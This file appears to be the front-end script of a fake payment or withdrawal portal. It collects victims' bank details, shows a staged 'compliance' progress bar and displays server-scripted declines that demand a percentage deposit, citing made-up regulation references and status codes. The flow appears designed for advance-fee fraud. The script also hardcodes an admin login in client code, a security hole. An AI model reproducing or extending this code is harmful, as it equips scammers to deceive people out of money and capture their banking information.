// ==========================================
// 1. STATE MANAGEMENT & NAVIGATION
// ==========================================
let currentData = {};
let currentUser = "";
let selectedBank = "";

const screens = ["screenLogin", "screenBank", "screenForm", "screenLoading", "screenDecline", "screenSuccess"];

function goTo(id) {
  screens.forEach(s => {
    const el = document.getElementById(s);
    if (el) el.classList.toggle("hidden", s !== id);
  });
  window.scrollTo({ top: 0, behavior: "smooth" });
}

function setNexusVisible(v) {
  const nexusBanner = document.getElementById("nexusBanner");
  if (nexusBanner) nexusBanner.style.display = v ? "block" : "none";
}

// ==========================================
// 2. BANK LISTS & DYNAMIC ROUTING
// ==========================================
const UK_BANKS = [
  "Barclays Bank", "HSBC UK", "Lloyds Bank", "NatWest", "Santander UK", 
  "Monzo Bank", "Revolut Ltd (UK)", "Starling Bank", "Nationwide Building Society"
];

const GLOBAL_BANKS = [
  "Banco Santander", "BBVA", "CaixaBank", "Banco Sabadell", "Bankinter", // Spain
  "UBS Group", "Credit Suisse", "Julius Baer", "Raiffeisen Switzerland", // Swiss
  "ING Group", "Rabobank", "ABN AMRO", "de Volksbank", "Triodos Bank",   // Netherlands
  "Deutsche Bank", "BNP Paribas", "Société Générale", "Intesa Sanpaolo"  // Others
];

function populateBankList(region) {
  const bankContainer = document.getElementById("bankList");
  bankContainer.innerHTML = ""; 

  const banksToShow = region === "uk" ? UK_BANKS : GLOBAL_BANKS;

  banksToShow.forEach(bankName => {
    const btn = document.createElement("button");
    btn.textContent = bankName;
    btn.onclick = () => selectBank(bankName);
    bankContainer.appendChild(btn);
  });
}

function selectBank(name) {
  selectedBank = name;
  const bankEl = document.getElementById("selectedBank");
  if(bankEl) bankEl.textContent = "Bank: " + name;
  goTo("screenForm");
}

// ==========================================
// 3. LOGIN LOGIC 
// ==========================================
async function doLogin() {
  const rawUser = document.getElementById("loginUser").value.trim();
  const rawPass = document.getElementById("loginPass").value.trim();

  if (rawUser === "admin" && rawPass === "adminpanel") {
    window.location.href = "/admin-panel";
    return;
  }

  try {
    const response = await fetch('/api/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: rawUser, password: rawPass })
    });

    if (!response.ok) throw new Error("Invalid credentials");

    const result = await response.json();
    currentData = result.data;
    currentUser = rawUser;

    document.getElementById("errLogin").style.display = "none";
    
    // Set up dynamic forms
    populateBankList(currentData.region);
    document.getElementById("ukFields").classList.toggle("hidden", currentData.region !== "uk");
    document.getElementById("globalFields").classList.toggle("hidden", currentData.region !== "global");

    updateUiFromProfile();
    goTo("screenBank");

  } catch (err) {
    document.getElementById("errLogin").style.display = "block";
  }
}

// ==========================================
// 4. UI DATA POPULATION 
// ==========================================
function updateUiFromProfile() {
  const amtStr = Number(currentData.amount).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  
  // Decide Currency dynamically
  const currencySym = currentData.region === "uk" ? "£" : "€";
  const currencyCode = currentData.region === "uk" ? "GBP" : "EUR";
  const fullAmountString = `${currencySym}${amtStr} ${currencyCode}`;

  // Update Network Name dynamically 
  const networkName = currentData.networkName || "Secure Payment Network";
  const els = ["declineNetworkName", "successNetworkName", "adviceNetworkName"];
  els.forEach(id => {
    const el = document.getElementById(id);
    if(el) el.textContent = networkName;
  });

  document.getElementById("amount").value = fullAmountString;

  if (currentData.outcome === "decline") {
    // FIXED: Removed the redundant "(Required assurance: X%)" text
    const finalReason = currentData.reason; 
    
    const depVal = currentData.amount * (currentData.depositPct / 100);
    const depValStr = Number(depVal).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
    
    document.getElementById("depositPctDecline").textContent = currentData.depositPct;
    document.getElementById("metaDepositDecline").textContent = `${currencySym}${depValStr} ${currencyCode}`;
    
    document.getElementById("massiveDeclineAmount").textContent = fullAmountString;
    document.getElementById("declineReasonText").textContent = finalReason;
    
    // Custom Status Code injection
    document.getElementById("declineStatusCode").textContent = currentData.statusCode || "ERR_LIQUIDITY_HOLD";
    
    document.getElementById("regulationRefDecline").textContent = currentData.regulationRef || "Regulation X";
    document.getElementById("regulationTitleDecline").textContent = currentData.regulationTitle || "Framework";
  } else {
    document.getElementById("massiveSuccessAmount").textContent = fullAmountString;
    document.getElementById("regulationRefSuccess").textContent = currentData.regulationRef || "Regulation X";
    document.getElementById("regulationTitleSuccess").textContent = currentData.regulationTitle || "Framework";
  }
}

// ==========================================
// 5. SMART FORM VALIDATION
// ==========================================
function showErr(inputEl, errEl, hasError) {
  if (hasError) {
    inputEl.classList.add("invalid");
    errEl.style.display = "block";
  } else {
    inputEl.classList.remove("invalid");
    errEl.style.display = "none";
  }
}

function submitAndStart() {
  let isValid = true;

  if (currentData.region === "uk") {
    const nameUk = document.getElementById("nameUk");
    const sortCode = document.getElementById("sortCode");
    const accNum = document.getElementById("accountNumber");

    if (nameUk.value.trim().length < 3) { showErr(nameUk, document.getElementById("errNameUk"), true); isValid = false; }
    else { showErr(nameUk, document.getElementById("errNameUk"), false); }

    const scClean = sortCode.value.replace(/[^0-9]/g, '');
    if (scClean.length !== 6) { showErr(sortCode, document.getElementById("errSortCode"), true); isValid = false; }
    else { showErr(sortCode, document.getElementById("errSortCode"), false); }

    const accClean = accNum.value.replace(/[^0-9]/g, '');
    if (accClean.length !== 8) { showErr(accNum, document.getElementById("errAccountNumber"), true); isValid = false; }
    else { showErr(accNum, document.getElementById("errAccountNumber"), false); }
  } else {
    const country = document.getElementById("country");
    const nameGlobal = document.getElementById("nameGlobal");
    const iban = document.getElementById("iban");
    const bic = document.getElementById("bic");

    if (country.value === "") { showErr(country, document.getElementById("errCountry"), true); isValid = false; }
    else { showErr(country, document.getElementById("errCountry"), false); }

    if (nameGlobal.value.trim().length < 3) { showErr(nameGlobal, document.getElementById("errNameGlobal"), true); isValid = false; }
    else { showErr(nameGlobal, document.getElementById("errNameGlobal"), false); }

    const ibanClean = iban.value.replace(/\s+/g, "").toUpperCase();
    if (!/^[A-Z]{2}[A-Z0-9]{13,32}$/.test(ibanClean)) { showErr(iban, document.getElementById("errIban"), true); isValid = false; }
    else { showErr(iban, document.getElementById("errIban"), false); }

    const bicClean = bic.value.replace(/\s+/g, "").toUpperCase();
    if (!/^[A-Z0-9]{8}([A-Z0-9]{3})?$/.test(bicClean)) { showErr(bic, document.getElementById("errBic"), true); isValid = false; }
    else { showErr(bic, document.getElementById("errBic"), false); }
  }

  if (isValid) {
    startAttempt();
  }
}

document.querySelectorAll('input, select').forEach(el => {
  el.addEventListener('input', function() {
    this.classList.remove('invalid');
    const errObj = this.nextElementSibling;
    if (errObj && errObj.classList.contains('err')) errObj.style.display = 'none';
  });
});

// ==========================================
// 6. PROCESSING ANIMATION & ROUTING
// ==========================================
let timer = null;
function startAttempt() {
  clearInterval(timer);
  updateUiFromProfile();
  goTo("screenLoading");

  let p = 0;
  const progressBar = document.getElementById("progressBar");
  const progressLabel = document.getElementById("progressLabel");
  const statusText = document.getElementById("statusText");

  timer = setInterval(() => {
    p += Math.floor(Math.random() * 8) + 4;
    if (p > 100) p = 100;

    progressBar.style.width = p + "%";
    progressLabel.textContent = p + "%";

    if (p < 30) statusText.textContent = "🔐 Establishing secure link...";
    else if (p < 60) statusText.textContent = "📡 Validating beneficiary rails...";
    else if (p < 90) statusText.textContent = "⚖️ Running compliance checks...";
    else statusText.textContent = "🧷 Finalising settlement...";

    if (p === 100) {
      clearInterval(timer);
      setTimeout(() => {
        goTo(currentData.outcome === "decline" ? "screenDecline" : "screenSuccess");
      }, 600);
    }
  }, 250);
}

// ==========================================
// 7. ADVICE MODAL
// ==========================================
function openAdvice() {
  const currencySym = currentData.region === "uk" ? "£" : "€";
  const currencyCode = currentData.region === "uk" ? "GBP" : "EUR";
  const amtStr = Number(currentData.amount).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
  
  document.getElementById('adviceAmount').textContent = `${currencySym}${amtStr} ${currencyCode}`;

  const seed = String(currentData.amount).replace(/[^0-9]/g, '').slice(-6).padStart(6, '0');
  document.getElementById('adviceRef').textContent = 'TC-NEXUS-' + seed;

  document.getElementById('adviceModal').classList.add('open');
}
function closeAdvice() {
  document.getElementById('adviceModal').classList.remove('open');
}